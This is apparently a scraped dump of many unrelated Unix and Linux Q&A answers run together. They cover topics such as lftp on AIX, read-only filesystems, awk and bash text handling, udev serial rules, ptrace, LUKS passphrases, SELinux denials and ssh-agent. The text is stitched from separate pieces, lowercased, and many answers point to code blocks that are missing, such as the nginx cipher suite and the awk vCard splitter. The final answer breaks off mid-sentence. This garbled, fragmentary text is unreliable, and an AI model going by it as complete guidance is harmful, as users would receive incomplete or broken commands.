the standard aix ftp client does not support ssl or tls . i would be very interested if you find a way to get this going without 3rd party tools . you can grab lftp from several sources . . . we have used that in production successfully for a few years now on aix 5.3 . i have used the rpm available here lftp rpm for aix , as well as compiling from source lftp download , although the latter can take a bit of extra work for things like gnutls .
the default behaviour for most linux file systems is to safeguard your data . when the kernel detects an error in the storage subsystem it will make the filesystem read-only to prevent ( further ) data corruption . you can tune this somewhat with the mount option errors={continue|remount-ro|panic} which are documented in the system manual ( man mount ) . when your root file-system encounters such an error , most of the time the error will not be recorded in your log-files , as they will now be read-only too . fortunately since it is a kernel action the original error message is recorded in memory first , in the kernel ring buffer . unless already flushed from memory you can display the contents of the ring buffer with the dmesg command . . most real hard disks support smart and you can use smartctl to try and diagnose the disk health . depending on the error messages , you could decide it is still safe to use file-system and return it read-write condition with mount -o remount,rw / in general though , disk errors are a precursor to complete disk failure . now is the time to create a back-up of your data or to confirm the status of your existing back-ups .
you can do it with awk . there are nicer ways to do it , but this is the simplest , i think . echo '192.168.1.1' | awk 'BEGIN{FS="."}{print $4"."$3"."$2"."$1".in-addr.arpa"}'  this will reverse the order of the ip address . just to save a few keystrokes , as mikel suggested , we can further shorten the upper statement : echo '192.168.1.1' | awk -F . '{print $4"."$3"."$2"."$1".in-addr.arpa"}'  or echo '192.168.1.1' | awk -F. '{print $4"."$3"."$2"."$1".in-addr.arpa"}'  or echo '192.168.1.1' | awk -F. -vOFS=. '{print $4,$3,$2,$1,"in-addr.arpa"}'  awk is pretty flexible . : )
you could install a virtual machine manager that can access partitions on the host system during install like virtualbox . repartition your drive in os x with disk utility so you have space to install arch linux . install virtualbox for os x . in order to have virtualbox access a partition you will have to manually edit a vmdk file . install arch linux inside virtualbox on a real partition of the host system . to be on the safe side , make sure you only give access to your new arch linux partition and not the os x or efi partition at this point . since arch does not recommend installing grub2 to a partition boot sector , and most other bootloaders are not officially supported , i recommend using syslinux and guid partition table layout ( gpt ) instead of mbr . make sure to edit syslinux . cfg so that the append statement contains your disk uuid instead of the device path . see here how to find partition uuid 's . install refind bootloader in os x . the next time you boot , it will scan your partitions and find your arch install and give you the option to boot it .
this should work : find . -type f -name "*.GEOT14246.*" -print0 | \ xargs -0 rename 's/GEOT14246/GEOT15000/'  given there is not directories named *.GEOT14246.* a bash variant using find could be something like : relative , but full , paths are passed from find – which you should see from the printf statement . the new name is compiled by using bash : ${some_variable/find/replace}  to replace all find 's use : ${some_variable//find/replace}  etc . more here . this could also be a good read : bashpitfalls , usingfind . read some guides like bashguide . find some tutorials on-line , but usually never trust them , ask here or on irc . freenode .net#bash . you do not need to invoke the script by calling sh . that would also call bourne shell ( sh ) and not bourne again shell ( bash ) . if you intend to run it with bash ; issue bash file . .sh extension is also out of place . what you normally do is make the file executable by : chmod +x script_file  and then run it with : ./script_file  the shebang takes care of what environment the script should run in . in your script you do not use the passed path-name anywhere . the script has a " argument list " starting from $0 which is the script name , $1 first argument , $2 second , - and so on . in your script you would do something in the direction of : your current mv statement would move all files to wherever you issue the command – to one file named . geot14246 . ( as in overwrite for each mv statement ) : before script run : after script run : $ tree . \u251c\u2500\u2500 d1 \u2502\xa0\xa0 \u251c\u2500\u2500 a1 \u2502\xa0\xa0 \u2502\xa0\xa0 \u2514\u2500\u2500 a2 \u2502\xa0\xa0 \u2502\xa0\xa0 \u2514\u2500\u2500 a3 \u2502\xa0\xa0 \u2514\u2500\u2500 b1 \u2502\xa0\xa0 \xa0\xa0 \u2514\u2500\u2500 b2 \u2502\xa0\xa0 \xa0\xa0 \u2514\u2500\u2500 b3 \u2514\u2500\u2500 *.GEOT15000.*  also files / paths with spaces or other funny things would make the script go bad and spread havoc . therefor you have to quote your variables ( such as "$file" ) .
you can use awk for the job : details the awk line works like this : a is counter that is incremented on each BEGIN:VCARD line and at the same time the output filename is constructed using sprintf ( stored in fn ) . for each line the current line ( $0 ) is appended ( &gt;&gt; ) to the current file ( named fn ) . the last echo $? means that the cmp was successful , i.e. all single files concatenated are equal to the original example vcf example . note that the awk line assumes that you have no files named card_[0-9][0-9].vcf in your current working directory . you can also replace it with something like which would overwrite existing files .
you are using double quotes to delimit the string as well as inside the string itself , so the quoted string stops early and your internal quote characters are not included : sed -i "s|"jdbc:mysql:... Ends here-^  you can escape each of the quotes inside the string : now , each double quote inside the sed command has a backslash before it , to stop the shell from interpreting it . alternatively , you can use single quotes around the sed argument : in order to have the variables still be replaced , we are leaving single quotedness around each variable : 'AB'"$VAR"'CD' . we double-quote the variables in the shell to stop them being expanded into multiple words .
if you just want to toggle the menu bar , there is already a command for that ( m-x menu-bar-mode ) . to bind it to a key , you had do : (global-set-key (kbd "&lt;f5&gt;") 'menu-bar-mode)  if you want both the menu and toolbar to be toggled , you can do something like this : it is probably worth looking at the emacs faq ( also found by c-h c-f ) . also , the so info page for emacs has a bunch of good links .
initial ramdisks use busybox to save space . essentially , utilities like mv and cp all share a lot of common logic - open a file descriptor , read buffers into memory , etc . busybox basically puts all the common logic into one binary which changes the way it behaves depending on the name with which it was called . let 's take a look at that ramdisk . as you can see , almost every single binary in this image is linked to busybox . there are 116 files in the image , but only 14 of them are actually binaries . the rest are symlinks to either kmod or busybox . so : the reason that there are so many random utilities is because you might as well put them in there . the symlinks do not take up any space , and even if you removed them , the functionality would remain in the busybox binary , taking up space . since there is no real reason to remove all the links , the packagers do not . here 's another question to consider : why not simply remove the network functionality from the busybox binary ? as @gilles mentions , there are legitimate ( if not common ) cases where you would need networking in an initcpio . therefore , the packagers have two options : one , do what they do now and just include it all by default , or two , split networking functionality out into its own mkinitcpio hook . the former is dead-easy ( you basically do nothing ) and costs a very , very small amount , whereas the second is very complex ( again , thanks to @gilles for pointing this out ) and the gains really are not significant enough to matter . therefore , the packagers take the smart way out , and do not do anything with the networking .
$ apt-cache search rdiff fuse rdiff-backup-fs - Fuse filesystem for accessing rdiff-backup archives  ( untested ) . http://code.google.com/p/rdiff-backup-fs/
in the settings manager choose window manager tweaks , then on the third tab , accessibility you will find the control key used to grab and move windows :
well , you can do something sneaky like : $ echo "`date +%s` - ( 1125 * 24 * 60 *60 ) " |bc 1194478815 $ date -r 1194478689 wed , 07 nov 2007 18:38:09 -0500 tested on openbsd ( definitely non gnu based date ) , and seems to work . breaking it down in steps : get the current unixtime ( seconds since beginning of unix epoch ) : $ date +%s 1291679934 get the number of seconds in 1125 days $ echo "1125 * 24 * 60 *60" | bc 97200000 subtract one from the other ( 1291679934 - 97200000 ) = 1194478815 use the new unixtime ( 1194478815 ) to print a pretty date $ date -r 1194478689 wed , 07 nov 2007 18:38:09 -0500 as an alternative , on solaris you can do this to print the date*: /bin/echo "0t1194478815> y\n&lt ; y=y " |adb * referenced from http://www.sun.com/bigadmin/shellme/ also , an alternative on solaris for getting the current timestamp from the date command** is : /usr/bin/truss /usr/bin/date 2> and 1 | nawk -f= '/^time ( ) / {gsub ( / / , "" , $2 ) ; print $2}' ** referenced from http://www.commandlinefu.com/commands/view/7647/unix-timestamp-solaris
where does the cron process look for the default mail binary ? unless otherwise specified i am fairly sure it just uses the mail program it finds in the path ( /bin:/usr/bin ) . you can though specify the -m command line argument for some versions of cron -m this option allows you to specify a shell command string to use for sending cron mail output instead of sendmail ( 8 ) . this com- mand must accept a fully formatted mail message ( with headers ) on stdin and send it as a mail message to the recipients speci- fied in the mail headers . the above works on centos/rhel , ubuntu looks different can you set or configure this path ? see above . if the mailto= variable is not set . . . if mailto is not set then as you suspect the mail is delivered to the local user who is running the job . on centos/rhel you can specify extra command line arguments in /etc/sysconfig/crond so that you dont't have to edit your init scripts . other os/distros may provide similar functionality .
try following the steps in this faq entrty
the distro called ipcop exists since 2007 and is designed exactly for your purpose . http://distrowatch.com/table.php?distribution=ipcop i think there are many reasons strongly in favor of ipcop that put it ahead of the bunch : designed for your purpose long history + high ranking in google search " linux firewall distro " latest release : 2012 february as the other post mentions , pfsense can be interesting to , a big difference is that pfsense ( like moonwall ) is based on freebsd , not on linux .
the right to access a serial port is determined by the permissions of the device file ( e . g . /dev/ttyS0 ) . so all you need to do is either arrange for the device to be owned by you , or ( better ) put yourself in the group that owns the device , or ( if fedora supports it , which i think it does ) arrange for the device to belong to the user who is logged in on the console . for example , on my system ( not fedora ) , /dev/ttyS0 is owned by the user root and the group dialout , so to be able to acesss the serial device , i would add myself to the dialout group : usermod -a -G dialout MY_USER_NAME 
with zsh: dirs=(*(/)) mkdir -- $^dirs/doc touch -- $^dirs/doc/doc1.txt  (/) is a globbing qualifier , / means to select only directories . $^array ( reminiscent of rc 's ^ operator ) is to turn on a brace-like type of expansion on the array , so $^array/foo is like {elt1,elt2,elt3}/doc ( where elt1 , elt2 , elt3 are the elements of the array ) . one could also do : mkdir -- *(/e:REPLY+=/doc:) touch -- */doc(/e:REPLY+=/doc1.txt:)  where e is another globbing qualifier that executes some given code on the file to select . with rc/es/akanga: dirs = */ mkdir -- $dirs^doc touch -- $dirs^doc/doc1.txt  that is using the ^ operator which is like an enhanced concatenation operator . rc does not support globbing qualifiers ( which is a zsh-only feature ) . */ expands to all the directories and symlinks to directories , with / appended . with tcsh: set dirs = */ mkdir -- $dirs:gs:/:/doc::q touch -- $dirs:gs:/:/doc/doc1.txt::q  the :x are history modifiers that can also be applied to variable expansions . :gs is for global substitute . :q quotes the words to avoid problems with some characters . with zsh or bash: dirs=(*/) mkdir -- "${dirs[@]/%/doc}" touch -- "${dirs[@]/%/doc/doc1.txt}"  ${var/pattern/replace} is the substitute operator in korn-like shells . with ${array[@]/pattern/replace} , it is applied to each element of the array . % there means at the end . various considerations : dirs=(*/) includes directories and symlinks to directories ( and there is no way to exclude symlinks other than using [ -L "$file" ] in a loop ) , while dir=(*(/)) ( zsh extension ) only includes directories ( dir=(*(-/)) to include symlinks to directories without adding the trailing slash ) . they exclude hidden dirs . each shell has specific option to include hidden files ) . if the current directory is writable by others , you potentially have security problems . as one could create a symlink there to cause you to create dirs or files where you would not want to . even with solutions that do not consider symlinks , there is still a race condition as one may be able to replace a directory with a symlink in between the dirs=(*/) and the mkdir... .
try setting either bell-on-alert [on | off] ( off ) or bell-action [any | none | current] ( none ) . there is visual-bell [on | off] also .
all modern operating systems support multitasking . this means that the system is able to execute multiple processes at the same time ; either in pseudo-parallel ( when only one cpu is available ) or nowadays with multi-core cpus being common in parallel ( one task/core ) . let 's take the simpler case of only one cpu being available . this means that if you execute at the same time two different processes ( let 's say a web browser and a music player ) the system is not really able to execute them at the same time . what happens is that the cpu is switching from one process to the other all the time ; but this is happening extremely fast , thus you never notice it . now let 's assume that while those two processes are executing , you press the reset button ( bad boy ) . the cpu will immediately stop whatever is doing and reboot the system . congratulations : you generated an interrupt . the case is similar when you are programming and want to ask for a service from the cpu . the difference is that in this case you execute software code -- usually library procedures that are executing system calls ( for example fopen for opening a file ) . thus 1 describes two different ways of getting attention from the cpu . most modern operating systems support two execution modes : user mode and kernel mode . by default an operating system runs in user mode . user mode is very limited . for example , all i/o is forbidden ; thus , you are not allowed to open a file from your hard disk . of course this never happens in real , because when you open a file the operating system switches from user to kernel mode transparently . in kernel mode you have total control of the hardware . if you are wondering why those two modes exist , the simplest answer is for protection . microkernel-based operating systems ( for example minix 3 ) have most of their services running in user mode , which makes them less harmful . monolithic kernels ( like linux ) have almost all their services running in kernel mode . thus a driver that crashes in minix 3 is unlikely to bring down the whole system , while this is not unusual in linux . system calls are the primitive used in monolithic kernels ( shared data model ) for switching from user to kernel mode . message passing is the primitive used in microkernels ( client/server model ) . to be more precise , in a message passing system programmers also use system calls to get attention from the cpu . message passing is visible only to the operating system developers . monolithic kernels using system calls are faster but less reliable , while microkernels using message passing are slower but have better fault isolation . thus 2 mentions two different ways of switching from user to kernel mode . to revise , the most common way of creating a software interrupt , aka trap , is by executing a system call . interrupts on the other hand are generated purely by hardware . when we interrupt the cpu ( either by software or by hardware ) it needs to save somewhere its current state -- the process that it executes and at which point it did stop -- otherwise it will not be able to resume the process when switching back . that is called a context switch and it makes sense : before you switch off your computer to do something else , you first need to make sure that you saved all your programs/documents , etc so that you can resume from the point where you stopped the next time you will turn it on : ) thus 3 explains what needs to be done after executing a trap or an interrupt and how similar the two cases are .
there seem to be two possibilities : you are passing \r as part of the filename . this should not normally happen . it could happen if you have a file with mismatched eol characters . windows uses a crlf pair to end a line in a text file ; unix uses only lf . depending on how you edit the file , you can manage to get crlf in there , and that will break all kinds of things . another variant of this is that if out1 is actually coming from a variable ( make_ndx -o "$out1" ) , you may have captured a lf in the variable . doing echo -n "$out1" | xxd -p will let you know if you have ; check if it ends in 0a . make_ndx is buggy . the command does not get passed \r , its inserting it internally . nothing you can do from a bash script ( well , other than mv to fix the name ) . if you have source to make_ndx , you could fix it yourself , else you will need to contact whoever supports it . you can check for mixed line endings a bunch of ways . for example , if you use xxd to take a hex dump of the bash script , 0x0d is cr ( \r ) . 0x0a is lf ( \n ) . you should not see any crs in the file .
definitions : ${string%substring} deletes shortest match of $substring from the end of $string . ${string##substring} deletes longest match of $substring from the start of $string . your example : abspath=$(cd ${0%/*} &amp;&amp; echo $PWD/${0##*/})  ${0%/*} deletes everything after the last slash , giving you the directory name of the script ( which might be a relative path ) . ${0##*/} deletes everything upto the last slash , giving you just the name of the script . so , this command changes to the directory of the script and concatenates the current working directory ( given by $PWD ) and the name of the script giving you the absolute path . to see what is going on try : echo ${0%/*} echo ${0##*/} 
i just found it . i use ctrl + alt to switch keyboard layout . if i change that to something else , then all the ctrl + alt shortcuts works as it should . must be a bug then .
jetty is in the debian repositories , but at the moment only in the testing distribution , not in the stable distribution which is what you have . it looks like jetty does not have many dependencies that are not in lenny ( stable ) , so a viable option is to keep your lenny system , but install a few binary packages from squeeze ( testing ) . this is viable only if the testing packages do not depend on having recent ( post-stable ) versions of libraries . in particular , native executables are usually out since they require upgrading the the c library . add squeeze repositories to your sources by putting these lines in a file /etc/apt/sources.list.d/squeeze.list: deb http://http.us.debian.org/debian squeeze main contrib non-free deb http://security.debian.org/debian squeeze main contrib non-free  then you will be able to install packages from squeeze . but do not stop there , otherwise the next time you run apt-get upgrade , your system will become ( almost ) all-testing . create a file /etc/apt/preferences containing the following lines : Package: * Pin: release o=Debian,a=testing Pin-Priority: 200  then packages from testing have a priority of 200 , which is less than the default ( 500 ) . so a package from testing will be installed only if there is no package with the same name in stable .
grab this handle , and drag it up :
there is a system call named ptrace . it takes 4 parameters : the operation , the pid of the target process , an address in the target process memory , and a data pointer . the way the last 2 parameters are used is dependent on the operation . for example you can attach/detach your debugger to a process : ptrace(PTRACE_ATTACH, pid, 0, 0); ... ptrace(PTRACE_DETACH, pid, 0, 0);  single step execution : you can also read/write the memory of the target process with ptrace_peekdata and ptrace_pokedata . if you want to see a real example check out gdb .
thanks to darwinsurvivor 's answer i have been able to better understand how package management works in arch . now i can apply the same strategy that i use with gentoo ( with small modifications ) . the " equivalents " of the commands in the question are , respectively : pacman -S &lt;package&gt; pacman -D --asdeps &lt;package&gt; pacman -Rs $(pacman -Qqtd) not available / not needed the closest thing to /var/lib/portage/world in gentoo is the result of the command pacman -Qe . differences : arch has package groups , which is basically several packages " grouped " together under a name . when a group is installed everything in the group is considered explicitly installed . arch does not have " system packages " , so reducing items from the result of pacman -Qe can actually result in important packages being removed .
there is no default standart way to setup a firewall in debian , except maybe calling a script with a pre rule in the network configuration ( /etc/network/interfaces ) but there are many packages providing different ways to do it . for example the packages uruk and iptables-persistent provide very simple scripts to load and backup a very simple firewall .
programs connect to files through a number maintained by the filesystem ( called an inode on traditional unix filesystems ) , to which the name is just a reference ( and possibly not a unique reference at that ) . so several things to be aware of : moving a file using mv does not change that underling number unless you move it across filesystems ( which is equivalent to using cp then rm on the original ) . because more than one name can connect to a single file ( i.e. . we have hard links ) , the data in " deleted " files does not go away until all references to the underling file go away . perhaps most important : when a program opens a file it makes a reference to it that is ( for the purposes of when the data will be deleted ) equivalent to a having a file name connected to it . this gives rise to several behaviors like : a program can open a file for reading , but not actually read it until after the user as rmed it at the command line , and the program will still have access to the data . the one you encountered : mving a file does not disconnect the relationship between the file and any programs that have it open ( unless you move across filesystem boundaries , in which case the program still have a version of the original to work on ) . if a program has opened a file for writing , and the user rms it is last filename at the command line , the program can keep right on putting stuff into the file , but as soon as it closes there will be no more reference to that data and it will go away . two programs that communicate through one or more files can obtain a crude , partial security by removing the file ( s ) after they are finished opening . ( this is not actual security mind , it just transforms a gaping hole into a race condition . )
this is better done from a script though with exec $0. or if one of those file descriptors directs to a terminal device that is not currently being used it will help - you have gotta remember , other processes wanna check that terminal , too . and by the way , if your goal is , as i assume it is , to preserve the script 's environment after executing it , you had probably be a lot better served with : . ./script  the shell 's .dot and bash's source are not one and the same - the shell 's .dot is posix specified as a special shell builtin and is therefore as close to being guaranteed as you can get , though this is by no means a guarantee it will be there . . . though the above should do as you expect with little issue . for instance you can : the shell will run your script and return you to the interactive prompt - so long as you avoid exiting the shell from your script , that is , or backgrounding your process - that'll link your i/o to /dev/null. demo : many JOBS it is my opinion that you should get a little more familiar with the shell 's built-in task management options . @kiwy and @jillagre have both already touched on this in their answers , but it might warrant further detail . and i have already mentioned one posix-specified special shell built-in , but set, jobs, fg, and bg are a few more , and , as another another answer demonstrates trap and kill are two more still . if you are not already receiving instant notifications on the status of concurrently running backgrounded processes , it is because your current shell options are set to the posix-specified default of -m , but you can get these asynchronously with set -b instead : % man set  a very fundamental feature of unix-based systems is their method of handling process signals . i once read an enlightening article on the subject that likens this process to douglas adams ' description of the planet nowwhat : " in the hitchhiker 's guide to the galaxy , douglas adams mentions an extremely dull planet , inhabited by a bunch of depressed humans and a certain breed of animals with sharp teeth which communicate with the humans by biting them very hard in the thighs . this is strikingly similar to unix , in which the kernel communicates with processes by sending paralyzing or deadly signals to them . processes may intercept some of the signals , and try to adapt to the situation , but most of them do not . " this is referring to kill signals . at least for me , the above quote answered a lot of questions . for instance , i would always considered it very strange and not at all intuitive that if i wanted to monitor a dd process i had to kill it . after reading that it made sense . i would say most of them do not try to adapt for good reason - it can be a far greater annoyance than it would be a boon to have a bunch of processes spamming your terminal with whatever information their developers thought might have been important to you . depending on your terminal configuration ( which you can check with stty -a ) , CTRL+Z is likely set to forward a SIGTSTP to the current foreground process group leader , which is likely your shell , and which should also be configured by default to trap that signal and suspend your last command . again , as the answers of @jillagre and @kiwy together show , there is no stopping you from tailoring this functionality to your purpose as you prefer . SCREEN JOBS so to take advantage of these features it is expected that you first understand them and customize their handling to your own needs . for example , i have just found this screenrc on github that includes screen key-bindings for SIGTSTP: # hitting 'C-z C-z' will run Ctrl+Z (SIGTSTP, suspend as usual) bind ^Z stuff ^Z # hitting 'C-z z' will suspend the screen client bind z suspend  that would make it a simple matter to suspend a process running as a child screen process or the screen child process itself as you wished . and immediately afterward : % fg  or : % bg  would foreground or background the process as you preferred . the jobs built-in can provide you a list of these at any time . adding the -l operand will include pid details .
you got the right return code , sftp session executed correctly so the return code is 0 . you should use scp instead , it does not returns 0 if it fails to copy . you could do something like : edit : i changed the copy target to a file name : if you copy to a directory and that directory is missing , you will create a file that has the directory name .
there is no pre-determined , or even globally preferred , location . the closest analogue i know of would be the /usr/src tree in red hat enterprise linux and derivatives , but most applications that you compile are designed to be unrolled into their own directories , compiled as a non-privileged user , and only then installed with root privileges .
you can use : rpm -Kv xmlrpc-epi-0.54.2-1.x86_64.rpm  to display the package 's signature ( if it has one ) . from that you could try and trace back the originator of the package . the package itself ( without signature ) could have been rebuild by anyone . if it is not signed i would try ( from the generic rpm field data ) to see if it was built on the machine itself . you can also try the logs if they go back to october last year to find out when file was copied to the machine if it was not build on it ( might have been scp-ed ) .
you must quote the pattern in -name option : count=`/usr/bin/find /path/to/$MYDIR -name '*.txt' -mmin -60 | wc -l`  if you do not use the quote , so the shell will expand the pattern . your command become : /usr/bin/find /path/to/$MYDIR -name file1.txt file2.txt ... -mmin -60 | wc -l  you feed all files , which has name end with .txt to -name option . this causes syntax error .
i believe this is the cipher suite you are looking for : adding this to nginx should give you what you want : be sure to test these changes using qualys’s ssl server test . references hardening your web server’s ssl ciphers
@umair i am not sure why sdb is showing as removable , could you post the o/p of this script for device in /sys/block/* do if udevadm info --query=property --path=$device | grep -q ^ID_BUS=usb then echo $device fi done 
there is not much point in doing this . ordinarily , the point of changing passwords regularly is that if someone else has learned your password , you limit how long they can use it . but a luks password is used to decrypt the luks volume 's master key , the one that is actually used to encrypt the data , so if someone learns your password , they can use it to get that master key . changing your password does not change the master key — remember , it is the key used to actually encrypt the data ; changing it would require re-encrypting the entire drive — so you are not depriving the attacker of access to the drive . ( note , this assumes a technically-sophisticated attacker , someone able to find or write a program for unlocking a luks volume using the master key directly rather than a keyslot passphrase . changing passwords might help against someone who only knows how to interact with the normal luks password prompt — but against someone like that , you probably do not need disk encryption at all . )
monodevelop 4.2.2 suports vs 2013 solutions normaly , but you will need change toolsversion in your projects . open each one project in your solution , but open using a text editor your . csproj file and change toolsversion="12.0" to toolsversion="4.0"
installing gnome-tweak-tool lets you customize not only the wallpaper alignment , but other absent options such as enabling / disabling minimize and maximize buttons , showing icons on the desktop , changing the shell theme and colors , changing fonts and its options ( size , hinting , etc ) .
in terminal ( not graphic emulator like gterm ) works shift+pageup or shift+pagedown
in general you can use pkg . org to locate repositories : http://pkgs.org/search/?keyword=repository additionally i usually just google for the package name adding/subtracting bits from it is name depending on which distro i am looking for . centos/rhel : look for packages named el5 or el6 for either of these distros at version 5 or 6 . fedora : look for packages named f# where # is a number like 14 for fedora 14 or 18 for fedora 18 . this is a good list of the repositories available , most include packages for all the variants ( fedora , centos , rhel ) . http://wiki.centos.org/additionalresources/repositories repolist you can see what repos you do have with this command : references centos / rhel : list all configured repositories
try tar , pax , cpio , with something buffering . (cd /home &amp;&amp; bsdtar cf - .) | pv -trab -B 500M | (cd /dest &amp;&amp; bsdtar xpSf -)  i suggest bsdtar instead of tar because at least on some linux distributions tar is gnu tar which contrary to bsdtar ( from libarchive ) does not handle preserving extended attributes or acls or linux attributes . pv will buffer up to 500m of data so can better accommodate fluctuations in reading and writing speeds on the two file systems ( though in reality , you will probably have a disk slower that the other and the os ' write back mechanism will do that buffering as well so it will probably not make much difference ) . older versions of pv do not support -a ( for average speed reporting ) , you can use pv -B 200M alone there . in any case , those will not have the limitation of cp , that does the reads and the writes sequentially . here we have got two tar working concurrently , so one can read one fs while the other one is busy waiting for the other fs to finish writing . for ext4 and if you are copying onto a partition that is at least as large as the source , see also clone2fs which works like ntfsclone , that is copies the allocated blocks only and sequentially , so on rotational storage is probably going to be the most efficient . partclone generalises that to a few different file systems . now a few things to take into consideration when cloning a file system . cloning would be copying all the directories , files and their contents . . . and everything else . now the everything else varies from file system to file systems . even if we only consider the common features of traditional unix file systems , we have to consider : links : symbolic links and hard links . sometimes , we will have to consider what to do with absolute symlinks or symlinks that point out of the file system/directory to clone last modification , access and change times : only the first two can be copied using filesystem api ( cp , tar , rsync . . . ) sparseness : you have got that 2tb sparse file which is a vm disk image that only takes 3gb of disk space , the rest being sparse , doing a naive copy would fill up the destination drive . then if you consider ext4 and most linux file systems , you will have to consider : acls and other extended attributes ( like the ones used for SELinux ) linux attributes like immutable or append-only flags not all tools support all of those , or when they do , you have to enable it explicitly like the --sparse , --acls . . . options of rsync , tar . . . and when copying onto a different filesystems , you have to consider the case where they do not support the same feature set . you may also have to consider attributes of the file system themselves like the uuid , the reserved space for root , the fsck frequency , the journalling behavior , format of directories . . . then there are more complex file systems , where you can not really copy the data by copying files . consider for example zfs or btrfs when you can take snapshots of subvolumes and branch them off . . . those would have their own dedicated tools to copy data . the byte to byte copy of the block device ( or at least of the allocate blocks when possible ) is often the safest if you want to make sure that you copy everything . but beware of the uuid clash problem , and that implies you are copying onto something larger ( though you could resize a snapshot copy of the source before copying ) .
i managed to do so via bluez-tools : sudo apt-get install bluez-tools list of devices to get the mac address of my device : bt-device -l and successfully connect to it : bt-audio -c 01:02:03:04:05:06zz
this is a color definition : foreground \[\033[1;30m\]  background \[\033[44;1;31m\]  cheers ,
use the sysfs control files in /sys/class/gpio . the following links will hopefully be useful to helping you get started : http://www.avrfreaks.net/wiki/index.php/documentation:linux/gpio have seen reports of this article on the beagle board also working with the mini2440: http://blog.makezine.com/archive/2009/02/blinking_leds_with_the_beagle_board.html in your linux kernel documentation , look at documentation/gpio . txt too .
you have multiple choices depending of what you want from ubuntu : option 1 : install a gnome or unity desktop . this will add only the final desktop view . in that case you do not need a grub option , it is just a desktop option ( you can choose your desktop option on the login screen ) . option 2 : hard disk partition and system installation . intended for system uses . using a livecd or other ubuntu installation disk do a new partition on the hdd and install the ubuntu distro on the new partition . for this option follow a guide to partition and think a little bit about it . think about the option that you want . have in mind some things : ubuntu is a verion of debian , so why to change the base system ? if you want a beautiful desktop , there are plenty options on the web . partitioning is a little complex at start , but so some paper work and the pieces will fit soon . hope it helps .
you have just suffered from word splitting - use more quotes™ and use arrays if you want to send multiple parameters to a command : LOG_PARAMS=("--color" "--pretty=format:$FORMAT" "--abbrev-commit" "--no-walk") ... git log "${LOG_PARAMS[@]}" "$(commits)"  this works for me without the "$(commits)" part , which i guess is another function you created .
you want your rule to pay attention to the tty subsystem , not the usb one . SUBSYSTEM=="tty", ATTRS{idVendor}=="10c4", ATTRS{idProduct}=="ea60", SYMLINK+="serial"  a usb device generates several udev events when you plug it in as the kernel recognizes more things about it . since it is a usb device , it first engages the usb subsystem , which i think will create a raw usb device , which putty can not use . a few steps later it will load the device 's specific driver , and since this is a serial device , it will engage the tty subsystem , which creates a device file that putty can use . this rule will create a symlink to whichever /dev/ttyUSB* happens to be assigned to your device . tested successfully with putty on my own serial dongle . incidentally , for diagnostics i sometimes run the following rule , to get an idea of what the udev scripts are seeing : RUN+="/home/me/bin/udev-diag .$kernel .$number .$devpath .$id .$parent .$root .$tempnode"  where udev-diag is essentially : env &gt;&gt;/tmp/udev-events echo "$@" &gt;&gt;/tmp/udev-events  for more general use , the udevmonitor program is also handy .
the file is not created automatically , but you can create it with mdadm --detail --scan &gt;/etc/mdadm.conf . the file is not needed anymore as linux software raid improved since the document you linked to was written . besides , the command above does not create as much information anymore as when it was written . nowadays you can have your / on a linux software raid too ( all but /boot ) , so the raid has to work before /etc is even available . edit : as you described in raid mount not happening automatically it seems sometimes /etc/mdadm . conf is needed after all . seems linux software raid only looks for raid disks in certain places and your devices are not among them . my system runs fine without /etc/mdadm . conf as the raid disks are normal sata drives .
the solution is echo "$latexString\\\\" &gt;&gt; $outputFile 
it is probably bug in selinux policy with regards to semanage binary ( which has its own context semanage_t ) and /tmp directory , which has its own context too - tmp_t . i was able to reproduce almost same results on my centos 5.6 . # file /tmp/users . txt /tmp/users . txt : error : cannot open `/tmp/users . txt ' ( no such file or directory ) # semanage login -l > /tmp/users . txt # file /tmp/users . txt /tmp/users . txt : empty # semanage login -l > > /tmp/users . txt # file /tmp/users . txt /tmp/users . txt : empty when i tried to use file in different directory i got normal results # file /root/users . txt /root/users . txt : error : cannot open `/root/users . txt ' ( no such file or directory ) # semanage login -l > /root/users . txt # file /root/users . txt /root/users . txt : ascii text difference between /tmp and /root is their contexts # ls -zd /root/ drwxr-x--- root root root:object_r:user_home_dir_t /root/ # ls -zd /tmp/ drwxrwxrwt root root system_u:object_r:tmp_t /tmp/ and finally , after trying to redirect into file in /tmp i have got following errors in /var/log/audit/audit.log type=avc msg=audit ( 1310971817.808:163242 ) : avc : denied { write } for pid=10782 comm="semanage " path="/tmp/users . txt " dev=dm -0 ino=37093377 scontext=user_u:system_r:semanage_t:s0 tcontext=user_u:object_r:tmp_t:s0 tclass=file type=avc msg=audit ( 1310971838.888:163255 ) : avc : denied { append } for pid=11372 comm="semanage " path="/tmp/users . txt " dev=d m-0 ino=37093377 scontext=user_u:system_r:semanage_t:s0 tcontext=user_u:object_r:tmp_t:s0 tclass=file interesting note : redirecting semanage output to pipe works ok #semanage login -l | tee /tmp/users . txt > /tmp/users1 . txt # file /tmp/users . txt /tmp/users . txt : ascii text # file /tmp/users1 . txt /tmp/users1 . txt : ascii text
lookarounds are perl regex features . gnu grep implements them ( with the -P option ) . i cannot say whether any busybox command does . in this case though , you are just looking for the work after " on " . choose one of
my solution to this problem was to read the csv using python csv module and then dump the data as a vcard . a vcard can contain multiple contacts , just append them . the script : usage goes like : ./script.py myfile.csv &gt; mycontacts.vcf  then import the generated vcf file into evolution . ugly , but works .
i think using history completion is a much more universal way to do this $ sudo !!  most shells have some shortcut for the previous command . that one works in bash and zsh . there are various ways you can do substitution , but usually these are best left for removing or changing bits , if you want to expand it , just grabbing the whole thing is the simplest way . you can add whatever you like before and after the ! ! to expand on the previous command . edit : the original question was about prepending to the previous command which the above covers nicely . if you want to change something inside it as the commentor below the syntax would go like this : $ sudo !!:s/search/replace/  . . . where ' search ' is the string to match against and replace . . . well you get the idea .
while reading up on stuff i stumbled uppon this question . that gave me an idea for a workaround : [Desktop Entry] Encoding=UTF-8 Name=My Link Name Icon=my-icon Type=Application Categories=Office; Exec=xdg-open http://www.example.com/  this does exactly what i need and is a local application , so i can use xdg-desktop-menu to install this entry without problems .
if you are logging into a graphical session , arrange to start ssh-agent during your session startup . some distributions already do that for you . if yours does not , arrange to run ssh-agent from your session startup script or from your window manager . how do do that depends on your desktop environment and your window manager . for example , if you start your window manager manually , simply replace the call to my_favorite_wm by ssh-agent my_favorite_wm . do not start ssh-agent from .bashrc or .zshrc , since these files are executed by each new interactive shell . the place to start ssh-agent is in a session startup file such as .profile or .xsession . if you want to use the same ssh agent on all processes no matter where you logged in from , you can make it always use the same socket name , instead of using a randomly-named socket . for example , you might put this in your ~/.profile:
